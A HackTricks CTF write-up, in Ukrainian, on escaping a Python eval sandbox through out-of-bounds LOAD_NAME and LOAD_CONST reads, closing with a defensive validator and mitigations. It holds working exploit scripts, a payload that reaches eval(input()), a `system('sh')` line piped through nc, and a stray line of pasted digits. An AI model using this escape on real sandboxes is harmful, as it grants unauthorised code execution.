# OOB Read в opcode `LOAD_NAME` / `LOAD_CONST`

{{#include ../../../banners/hacktricks-training.md}}

Ця сторінка адаптує оригінальний writeup Splitline та exploit chain для HITCON CTF 2022 "V O I D".<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Операнд `LOAD_NAME` або `LOAD_CONST` може читати за межами навмисно скороченого кортежу `co_names` або `co_consts`. У цьому challenge недосяжні dummy names використовуються доти, доки сусідній запис не міститиме корисний атрибут, наприклад `__getattribute__`.<sup>[[1]](#references)</sup>

У решті payload використовується повторно отримане ім'я для побудови sandbox escape.<sup>[[1]](#references)</sup>

### Огляд <a href="#overview-1" id="overview-1"></a>

Wrapper challenge є коротким і компілює один вираз перед його оцінюванням:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Вхідні дані компілюються в об’єкт коду Python, після чого wrapper замінює його `co_consts` і `co_names` на порожні кортежі перед викликом `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Будь-яка згенерована інструкція, яка все ще індексує одну з цих таблиць, може призвести до аварійного завершення інтерпретатора або розкрити вказівник на сусідній об’єкт — залежно від збірки.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Як відбувається segfault?

Для виразу списку, наприклад `[a, b, c]`, компілятор генерує інструкції `LOAD_NAME` із послідовними операндами:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Якщо `co_names` замінити на `()`, байткод усе ще містить `LOAD_NAME 2`; тому неперевірений доступ до кортежу може отримати вказівник за межами кортежу замість виклику `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` і `LOAD_CONST` є основними примітивами: їхні цілочислові операнди вибирають записи відповідно в `co_names` і `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>

У механізмі диспетчеризації CPython `LOAD_CONST` отримує вибраний запис кортежу та поміщає його у стек; у релізних збірках використовується неперевірений засіб доступу до кортежу:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Перевіряйте операнди `LOAD_NAME`, поступово збільшуючи їх на цільовому інтерпретаторі, щоб відобразити корисні записи. Splitline виявив корисні зміщення понад 700 у середовищі challenge, але розташування залежить від конкретної збірки; debugger може допомогти перевірити прилеглу пам’ять.<sup>[[1]](#references)</sup>

### Генерування Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Щойно зміщення повертає корисне ім’я, розмістіть lookup за межами діапазону в недосяжному виразі та зверніться до того самого слота `co_names` через досяжний доступ до атрибута.<sup>[[1]](#references)</sup>

Наприклад, якщо зміщення 5 повертає `__getattribute__`, залиште це ім’я у слоті 5, а false branch нехай виконує корисний lookup:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Відновлений текст не обов’язково має бути `__getattribute__`; це місце може займати будь-який ідентифікатор, що використовується payload.<sup>[[1]](#references)</sup>

Компілятор повторно використовує слот `co_names` для повторних входжень одного імені, як демонструє дизасемблювання:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Оскільки `LOAD_ATTR` також отримує своє ім’я через `co_names`, доступна гілка може повторно використати цей слот; упаковані операнди в новіших версіях CPython описано в примітках щодо версій нижче.<sup>[[1]](#references)[[2]](#references)</sup>

Малі невід’ємні цілі числа можна синтезувати з булевих виразів без констант:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Оригінальний exploit використовував імена замість констант, щоб не перевищити обмеження довжини challenge.<sup>[[1]](#references)</sup>

Цей helper сканує можливі offsets імен, створюючи об’єкт коду з порожнім кортежем `co_names`.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Наведений нижче генератор зіставляє відновлені зміщення з іменами та генерує payload на рівні вихідного коду.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
На високому рівні payload отримує глобальні змінні функції, відновлює `builtins` і викликає `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Примітки щодо версій і опкоди, яких це стосується (Python 3.11–3.13)

- У CPython 3.11–3.13 інструкції все ще використовують цілочислові операнди для індексації таблиць констант і імен об’єкта коду. Якщо будь-який із кортежів коротший за індекс, на який посилаються, неперевірений доступ може прочитати сусідній вказівник на об’єкт і спричинити збій або виконати операції з ним; точна поведінка залежить від збірки інтерпретатора.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` і (починаючи з 3.12) `RETURN_CONST consti` читають `co_consts[consti]`.<sup>[[2]](#references)</sup>
- До інструкцій, які безпосередньо використовують таблицю імен, належать `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` і (починаючи з 3.12) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` і `LOAD_ATTR namei` використовують `co_names[namei >> 1]`; молодший біт керує документованою поведінкою NULL/методу. (Починаючи з 3.12) `LOAD_SUPER_ATTR namei` використовує `co_names[namei >> 2]` і зберігає два прапорці у своїх молодших бітах.<sup>[[2]](#references)</sup>
- У Python 3.11+ з’явилися адаптивні/inline caches, які додають приховані записи `CACHE` між інструкціями. Під час створення `co_code` вручну потрібно враховувати ці записи.<sup>[[2]](#references)</sup>

Практичний наслідок: структура байткоду та відновлені зміщення залежать від версії та збірки. Перед тим як покладатися на техніку, протестуйте її та будь-який згенерований payload у цільовій версії CPython.<sup>[[2]](#references)</sup>

### Швидкий сканер корисних OOB-індексів (сумісний із 3.11+/3.12+)

Якщо ви хочете безпосередньо перевіряти цікаві об’єкти з байткоду, а не з high-level source, можна створювати мінімальні об’єкти коду та перебирати індекси brute-force. Наведений нижче helper додає inline caches відповідно до метаданих `dis` цільового інтерпретатора.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Примітки
- Щоб перевіряти names замість цього, замініть `LOAD_CONST` на `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` і скоригуйте використання стека та упакований операнд для цільового opcode.<sup>[[2]](#references)</sup>
- За потреби використовуйте `EXTENDED_ARG` або кілька байтів `arg`, щоб досягти індексів >255. Цей helper генерує лише молодший байт операнда, тому для більших індексів потрібне створення raw bytes або кілька завантажень.<sup>[[2]](#references)</sup>

### Мінімальний bytecode-only RCE-патерн (co_consts OOB → builtins → eval/input)

Після визначення індексу `co_consts`, який повертає модуль builtins, можна відтворити `eval(input())` без `co_names`, маніпулюючи стеком. Матеріали official B01lers CTF 2024 `awpcode` описують цей самий OOB-read патерн.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Цей stack-only підхід корисний, коли challenge надає прямий контроль над `co_code`, водночас примусово встановлюючи `co_consts=()` і `co_names=()`; він дає змогу уникати source-level трюків і підтримувати payload невеликим, використовуючи stack operations байткоду та tuple builders.<sup>[[4]](#references)</sup>

### Захисні перевірки та mitigation для sandbox

Якщо ви пишете Python sandbox, який компілює або виконує недовірений код, не покладайтеся на CPython щодо перевірки меж індексів кортежів, які використовуються байткодом. Перевіряйте code objects перед їх виконанням.<sup>[[2]](#references)[[3]](#references)</sup>

Практичний validator (відхиляє OOB-доступ до co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Додаткові ідеї щодо mitigation
- Не дозволяйте довільний `CodeType.replace(...)` для ненадійних вхідних даних або додайте суворі структурні перевірки отриманого code object.
- Розгляньте можливість запуску ненадійного code в окремому процесі із sandboxing на рівні ОС (seccomp, job objects, containers), замість покладання на семантику CPython.

## References

- [1] [writeup Splitline's HITCON CTF 2022 "V O I D" (походження цієї technique та exploit chain на високому рівні)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Документація Python 3.13 `dis` (індекси bytecode, упаковані operands names та inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [Макроси доступу до tuple (`GETITEM`) у CPython 3.13.5](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [writeup challenge `awpcode` на B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
